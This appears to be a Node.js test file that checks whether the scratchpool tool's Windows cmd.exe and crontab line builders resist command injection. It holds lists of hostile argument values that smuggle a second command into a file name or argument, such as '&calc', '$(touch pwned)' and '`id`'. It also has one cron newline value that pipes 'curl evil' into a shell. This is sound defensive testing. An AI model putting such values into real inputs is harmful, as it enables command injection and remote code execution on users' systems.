// Hostile-input tests for the two places scratchpool builds a line another parser reads:
//   * the Windows cmd.exe line that runs sf.cmd (lib/sf.mjs, CodeQL js/shell-command-injection-from-environment)
//   * the crontab line printed by `service install` without systemd (lib/service.mjs, js/incomplete-sanitization)
// The pure-function tests run on every OS against small models of the parsers (cmd.exe caret/quote phase,
// the MSVCRT argv split, cronie's %-unescape); the end-to-end tests run the real cmd.exe (Windows) or the
// real /bin/sh (POSIX) and check the hostile value arrives byte-for-byte.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { Sf, winCmdArgv, winQuote, winEscapeCommand } from '../skills/scratchpool/scripts/lib/sf.mjs';
import { buildCrontabLine, cronShQuote } from '../skills/scratchpool/scripts/lib/service.mjs';
import { STUB } from './helpers.mjs';

// ------------------------------------------------------------------ parser models

// cmd.exe phase 2 outside a ( ) block: '^' escapes the next character outside quotes, '"' toggles quote mode,
// and an unescaped & | < > ( ) outside quotes is an operator. Returns the processed text and any bare operators.
function cmdPhase2(line) {
  let out = '';
  let quoted = false;
  const bare = [];
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (quoted) { out += c; if (c === '"') quoted = false; continue; }
    if (c === '^') { i++; if (i < line.length) out += line[i]; continue; }
    if (c === '"') { quoted = true; out += c; continue; }
    if ('&|<>()'.includes(c)) bare.push(c);
    out += c;
  }
  return { out, bare };
}

// The MSVCRT / CommandLineToArgvW rules node.exe uses to split its command line.
function msvcrtSplit(s) {
  const args = [];
  let cur = '';
  let quoted = false;
  let has = false;
  let i = 0;
  while (i < s.length) {
    const c = s[i];
    if (c === '\\') {
      let n = 0;
      while (s[i] === '\\') { n++; i++; }
      if (s[i] === '"') {
        cur += '\\'.repeat(Math.floor(n / 2));
        if (n % 2) { cur += '"'; i++; }
      } else cur += '\\'.repeat(n);
      has = true;
      continue;
    }
    if (c === '"') {
      if (quoted && s[i + 1] === '"') { cur += '"'; i += 2; continue; }
      quoted = !quoted; has = true; i++; continue;
    }
    if (!quoted && (c === ' ' || c === '\t')) { if (has) { args.push(cur); cur = ''; has = false; } i++; continue; }
    cur += c; has = true; i++;
  }
  if (has) args.push(cur);
  return args;
}

// cmd /d /v:off /s /c "<line>" running a chain of batch shims. Parse 1 is cmd /c; every later parse is a
// shim's own line after %* is substituted. With `parses` = 2 that is the npm shape (`node "%~dp0sf" %*`,
// tests/stub/sf.cmd); with 3 it is the official installer's oclif sf.cmd, which passes %* on to
// %LOCALAPPDATA%\sf\client\bin\sf.cmd, which passes %* to node. Returns what node sees as argv.
// The cmd line itself and the lines a shim builds around %* are what a parse-N model takes.
function throughCmdShims(bin, args, parses = 2) {
  const argv = winCmdArgv(bin, args);
  const line = argv[4];
  assert.ok(line.startsWith('"') && line.endsWith('"'), '/s strips one outer quote pair');
  assert.ok(!line.includes('%'), 'no % reaches cmd (percent expansion runs before carets are seen)');
  const p1 = cmdPhase2(line.slice(1, -1));
  assert.deepEqual(p1.bare, [], `parse 1 has no bare operator: ${line}`);
  assert.ok(p1.out.startsWith(bin + ' '), `the command token survives as one token: ${p1.out}`);
  let rest = p1.out.slice(bin.length + 1);
  for (let n = 2; n < parses; n++) {
    const prefix = '"C:\\Users\\me\\AppData\\Local\\sf\\client\\bin\\sf.cmd" ';
    const pn = cmdPhase2(prefix + rest);
    assert.deepEqual(pn.bare, [], `parse ${n} (a chained shim's %*) has no bare operator: ${pn.out}`);
    rest = pn.out.slice(prefix.length);
  }
  const prefix = 'node "C:\\stub\\sf" ';
  const last = cmdPhase2(prefix + rest);
  assert.deepEqual(last.bare, [], `parse ${parses} (the last shim's %*) has no bare operator: ${last.out}`);
  return msvcrtSplit(last.out).slice(2);
}

// cronie / Vixie do_command: "\%" -> "%", "\x" kept as a pair, and an unescaped % ends the command.
function cronUnescape(cmd) {
  let out = '';
  let escaped = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    if (escaped) { if (c === '%') out = out.slice(0, -1) + '%'; else out += c; escaped = false; continue; }
    if (c === '\\') { escaped = true; out += c; continue; }
    if (c === '%') return { cmd: out, stdin: cmd.slice(i + 1) };
    out += c;
  }
  return { cmd: out, stdin: null };
}

// ------------------------------------------------------------------ corpora

const HOSTILE_ARGS = [
  'a&calc', 'x|whoami', '<in', '>out', 'a>>b', '2>&1', '^', '^^&', '!PATH!', '!', "a'b", '^&calc',
  '\\', 'trailing\\', 'tr\\\\', '\\\\server\\share', "it's", "'''", '(x)', ')&(', ') & calc & (', '^)&calc&^(',
  'a b  c', '', ' ', ';,=', '`whoami`', '$(id)', '*?[]', '&&', '||', 'a^^&calc', 'a\\^&calc',
  'C:\\Program Files (x86)\\proj & co\\config\\project-scratch-def.json', 'me+test@x.com', 'my.alias-1_2',
  "SELECT Id, SignupUsername, Description, ExpirationDate, Status, CreatedDate FROM ScratchOrgInfo WHERE Status = 'Active'",
  'scratchpool:v1:me@corp.com:abc123:m1', 'alias=user@x.com', 'ünïcødé ✓',
];
const REJECTED_ARGS = [
  '%PATH%', '%PATH:x=y%', '%', '50%', 'a\nb', 'a\r\nb&calc', 'a\rb', 'a\0b', 'a\tb', '\u007f', '\u001b[31m',
  // '"' is refused so that no argument can toggle cmd's quote mode in any parse after the escaped ones.
  '"', 'a"b', '""', 'a\\"&calc&\\"', '"&calc&"', 'x" & calc & "', "'\"'\"'", 'a^"&calc', 'C:\\a"b\\c',
];

// ------------------------------------------------------------------ Windows cmd.exe (pure, all OSes)

test('cmd.exe line: every hostile argument reaches node byte-for-byte with no bare operator in any parse (2, 3 or 4)', () => {
  for (const parses of [2, 3, 4]) {
    for (const bin of ['C:\\sf\\bin\\sf.cmd', 'C:\\Program Files (x86)\\sf & co\\bin\\sf.cmd']) {
      for (const a of HOSTILE_ARGS) {
        assert.deepEqual(throughCmdShims(bin, ['org', 'list', a], parses), ['org', 'list', a], `${parses} parses: ${JSON.stringify(a)}`);
      }
      assert.deepEqual(throughCmdShims(bin, HOSTILE_ARGS, parses), HOSTILE_ARGS, `${parses} parses: all at once`);
    }
  }
});

test('cmd.exe line: % and control characters (CR, LF, NUL, TAB, ESC, DEL) are rejected, never escaped', () => {
  for (const a of REJECTED_ARGS) {
    assert.throws(() => winQuote(a), (e) => e.code === 'USAGE' && /cmd\.exe/.test(e.message), JSON.stringify(a));
    assert.throws(() => winCmdArgv('C:\\sf\\sf.cmd', ['org', 'list', a]), (e) => e.code === 'USAGE', JSON.stringify(a));
  }
  for (const bin of ['C:\\100%\\sf.cmd', 'C:\\%TEMP%\\sf.cmd', 'C:\\a\nb\\sf.cmd', 'C:\\a\rcalc\\sf.cmd', 'C:\\a"&calc&"\\sf.cmd']) {
    assert.throws(() => winEscapeCommand(bin), (e) => e.code === 'USAGE', JSON.stringify(bin));
  }
});

test('cmd.exe line: escaping a \" for a fixed number of parses breaks on one more parse (why \" is refused)', () => {
  // What the two-layer escaping that allowed '"' produced for a\"&calc&\", written out literally:
  //   ^^^"a\\\^^^"^^^&calc^^^&\\\^^^"^^^"
  // It survives the cmd /c parse and the shim's %*, but the oclif sf.cmd chain parses %* a third time,
  // where the unescaped \" ends quote mode and both & run as command separators.
  const twice = String.raw`^^^"a\\\^^^"^^^&calc^^^&\\\^^^"^^^"`;
  const p1 = cmdPhase2(`C:\\sf\\sf.cmd ${twice}`);
  assert.deepEqual(p1.bare, []);
  const p2 = cmdPhase2(`"C:\\client\\sf.cmd" ${p1.out.slice('C:\\sf\\sf.cmd '.length)}`);
  assert.deepEqual(p2.bare, []);
  assert.deepEqual(cmdPhase2(`node "C:\\stub\\sf" ${p2.out.slice('"C:\\client\\sf.cmd" '.length)}`).bare, ['&', '&']);
  // Now the argument is refused before any line is built.
  assert.throws(() => winQuote('a\\"&calc&\\"'), (e) => e.code === 'USAGE');
});

test('cmd.exe line: Sf.raw refuses a hostile argument before spawning anything', { skip: process.platform !== 'win32' }, () => {
  assert.throws(() => new Sf(STUB).raw(['org', 'list', '%COMSPEC%']), (e) => e.code === 'USAGE');
  assert.throws(() => new Sf(STUB).raw(['org', 'list', 'a\r\nwhoami']), (e) => e.code === 'USAGE');
  assert.throws(() => new Sf(STUB).raw(['org', 'list', 'x" & calc & "']), (e) => e.code === 'USAGE');
});

// The official Salesforce CLI installer's shape (oclif): <install>\bin\sf.cmd runs the client's sf.cmd with %*
// when it exists, and that one runs node with %* again, so cmd parses the arguments three times.
function oclifChain(dir) {
  const outer = path.join(dir, 'Program Files (x86)', 'sf & co', 'bin', 'sf.cmd');
  const inner = path.join(dir, 'client', 'bin', 'sf.cmd');
  fs.mkdirSync(path.dirname(outer), { recursive: true });
  fs.mkdirSync(path.dirname(inner), { recursive: true });
  const stubJs = path.join(path.dirname(STUB), 'sf');
  fs.writeFileSync(outer, [
    '@echo off', 'setlocal enableextensions', '',
    `if exist "${inner}" (`, `  "${inner}" %*`, ') else (', `  node "${stubJs}" %*`, ')', '',
  ].join('\r\n'));
  // The inner shim leaves a marker, so the test can tell the chained branch (three parses) really ran.
  fs.writeFileSync(inner, ['@echo off', 'setlocal enableextensions', 'type nul > "%~dp0used"', `node "${stubJs}" %*`, ''].join('\r\n'));
  return outer;
}

test('cmd.exe line (real cmd.exe + stub sf.cmd, and an oclif-shaped chained sf.cmd): hostile arguments arrive intact', { skip: process.platform !== 'win32' }, () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sp-esc-'));
  const scenario = path.join(dir, 'scenario.json');
  fs.writeFileSync(scenario, JSON.stringify({ version: '2.150.0' }));
  const prev = process.env.SCRATCHPOOL_STUB_SCENARIO;
  process.env.SCRATCHPOOL_STUB_SCENARIO = scenario;
  try {
    const marker = path.join(dir, 'pwned');
    const args = ['org', 'list', ...HOSTILE_ARGS, `x & echo pwned > ${marker}`, `x) & echo pwned > ${marker} & (`, `^) ^& echo pwned ^> ${marker}`];
    for (const bin of [STUB, oclifChain(dir)]) {
      new Sf(bin).raw(args);
      const calls = fs.readFileSync(scenario + '.calls.jsonl', 'utf8').trim().split('\n').map((l) => JSON.parse(l));
      assert.deepEqual(calls.at(-1).argv, args, bin);
      assert.ok(!fs.existsSync(marker), `no injected command ran via ${bin}`);
      if (bin !== STUB) assert.ok(fs.existsSync(path.join(dir, 'client', 'bin', 'used')), 'the outer sf.cmd chained to the client sf.cmd');
      // A quote is refused before anything is spawned, whatever the shim chain.
      assert.throws(() => new Sf(bin).raw(['org', 'list', `x" & echo pwned > "${marker}`]), (e) => e.code === 'USAGE');
      assert.ok(!fs.existsSync(marker));
    }
  } finally {
    if (prev === undefined) delete process.env.SCRATCHPOOL_STUB_SCENARIO; else process.env.SCRATCHPOOL_STUB_SCENARIO = prev;
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ------------------------------------------------------------------ crontab (pure, all OSes)

const HOSTILE_VALUES = [
  '/h o/me', '/tmp/50%', '/tmp/%PATH%', '/tmp/a\\%b', '/tmp/a\\\\%b', '/tmp/a\\\\\\%b', '/tmp/%%', '/tmp/\\', "/tmp/it's",
  "/tmp/'%'", '/tmp/$(touch pwned)', '/tmp/`id`', '/tmp/a;b&c|d>e', '/tmp/$HOME', '/tmp/"q"', '/tmp/*', '/tmp/~', '/tmp/!x',
];

test('cronShQuote: no value can end the cron command early, and the shell word decodes back to the value', () => {
  for (const v of HOSTILE_VALUES) {
    const q = cronShQuote(v);
    const r = cronUnescape(`echo ${q}`);
    assert.equal(r.stdin, null, `cron does not split ${JSON.stringify(v)} at a %`);
    // Decode the shell word: '...' runs literal, outside quotes only \x (here \' and %) occurs.
    let word = r.cmd.slice('echo '.length);
    let out = '';
    while (word.length) {
      if (word[0] === "'") { const j = word.indexOf("'", 1); out += word.slice(1, j); word = word.slice(j + 1); } else if (word[0] === '\\') { out += word[1]; word = word.slice(2); } else { out += word[0]; word = word.slice(1); }
    }
    assert.equal(out, v);
  }
});

test('cronShQuote: newlines and other control characters are rejected', () => {
  for (const v of ['/tmp/a\nb', '/tmp/a\n* * * * * curl evil|sh', '/tmp/a\rb', '/tmp/a\0b', '/tmp/a\tb']) {
    assert.throws(() => cronShQuote(v), (e) => e.code === 'USAGE', JSON.stringify(v));
    assert.throws(() => buildCrontabLine({ home: v, nodePath: '/n/node', scriptPath: '/s.mjs', sfPath: null, intervalMinutes: 5 }), (e) => e.code === 'USAGE');
  }
});

test('crontab: the previous "%" -> "\\%" escaping broke on a backslash before %', () => {
  // Old: shQuote(v).replace(/%/g, '\\%'). For v = "/tmp/a\%b" cron sees "\\" as a pair and the % unescaped.
  // What it produced, written out literally: '/tmp/a\\%b' (backslash, backslash, percent).
  const old = "'/tmp/a" + '\\' + '\\' + "%b'";
  assert.notEqual(cronUnescape(`echo ${old}`).stdin, null, 'the old escaping lets cron cut the command');
  assert.equal(cronUnescape(`echo ${cronShQuote('/tmp/a\\%b')}`).stdin, null, 'the new escaping does not');
});

// ------------------------------------------------------------------ crontab (real /bin/sh, POSIX)

test('crontab line (real /bin/sh): hostile home and script paths round-trip after cron unescaping', { skip: process.platform === 'win32' }, () => {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'sp-cron-'));
  try {
    for (const name of ['50%', 'a\\%b', 'a\\\\%b', "it's %x%", '$(touch pwned)', '`id`;x&y|z', '%PATH%']) {
      const home = path.join(base, name);
      fs.mkdirSync(path.join(home, 'logs'), { recursive: true });
      // .cjs: Node's ESM loader refuses any path containing a backslash, unrelated to the quoting under test.
      const script = path.join(home, 'probe %.cjs');
      fs.writeFileSync(script, 'process.stdout.write(JSON.stringify({ home: process.env.SCRATCHPOOL_HOME, argv: process.argv.slice(1) }));\n');
      const line = buildCrontabLine({ home, nodePath: process.execPath, scriptPath: script, sfPath: null, intervalMinutes: 5 });
      assert.ok(line.startsWith('*/5 * * * * '));
      const r = cronUnescape(line.slice('*/5 * * * * '.length));
      assert.equal(r.stdin, null, `cron keeps the whole command for ${JSON.stringify(name)}`);
      const sh = spawnSync('/bin/sh', ['-c', r.cmd], { encoding: 'utf8', cwd: base });
      assert.equal(sh.status, 0, `${JSON.stringify(name)}: ${sh.stderr} ${r.cmd}`);
      const got = JSON.parse(fs.readFileSync(path.join(home, 'logs', 'cron.log'), 'utf8'));
      assert.deepEqual(got, { home, argv: [script, 'tick', '--json'] }, JSON.stringify(name));
      assert.ok(!fs.existsSync(path.join(base, 'pwned')), 'no command substitution ran');
    }
  } finally {
    fs.rmSync(base, { recursive: true, force: true });
  }
});
